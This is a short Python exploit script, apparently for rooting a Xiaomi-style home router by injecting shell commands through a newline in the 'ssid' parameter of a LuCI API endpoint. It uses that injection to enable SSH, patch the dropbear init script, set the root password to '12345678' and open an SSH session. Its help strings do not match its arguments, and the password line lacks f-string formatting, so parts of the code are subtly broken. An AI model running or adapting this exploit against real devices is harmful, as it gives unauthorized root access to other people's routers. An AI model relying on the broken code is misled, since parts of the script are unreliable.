#!/usr/bin/env python3.6
import argparse
import requests
import sys
import os
import shutil
import urllib


def parse_arguments():
    parser = argparse.ArgumentParser(description='Root Unlocker')
    parser.add_argument('--stok', metavar='STOK', required=True, type=str,
                        help='path to bdata file')
    parser.add_argument('--gateway', metavar='GATEWAY', default="192.168.31.1",
                         help='path to modified bdata file')
    return parser.parse_args()


class Exploiter:
    def __init__(self, gateway, stok):
        self.stok = stok
        self.gateway = gateway
        self.ssh_password = "12345678"

    def ok(self):
        try:
            return requests.get(f"http://{self.gateway}", timeout=0.1).ok
        except:
            return False

    def _run_cmd(self, command):
        r = requests.get(f"http://{self.gateway}/cgi-bin/luci/;stok={self.stok}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0A{urllib.parse.quote(command)}")
        r.raise_for_status()
        res_code = r.json().get("code", -1)
        if res_code != 0:
            raise ValueError(f"command returned code: {res_code}")

    def gain_root(self):
        self._run_cmd("nvram set ssh_en=1")
        self._run_cmd("nvram commit")
        self._run_cmd("cp /etc/init.d/dropbear /etc/init.d/dropbear_backup")
        self._run_cmd("sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear")
        self._run_cmd("echo -e '{self.ssh_password}\n{self.ssh_password}' | passwd root")
        self._run_cmd("/etc/init.d/dropbear enable")
        self._run_cmd("/etc/init.d/dropbear start")

        print(f"done! ssh password is: {self.ssh_password}")
        if input("Do you want to ssh now? [y/n] ").lower() == "y":
            os.execl(shutil.which("ssh"), "ssh", f"root@{self.gateway}")

if __name__ == "__main__":
    args = parse_arguments()
    exploiter = Exploiter(args.gateway, args.stok)
    if not exploiter.ok():
        print("unable to perform exploit: web interface isn't responding.", file=sys.stderr)
        sys.exit(1)

    exploiter.gain_root()
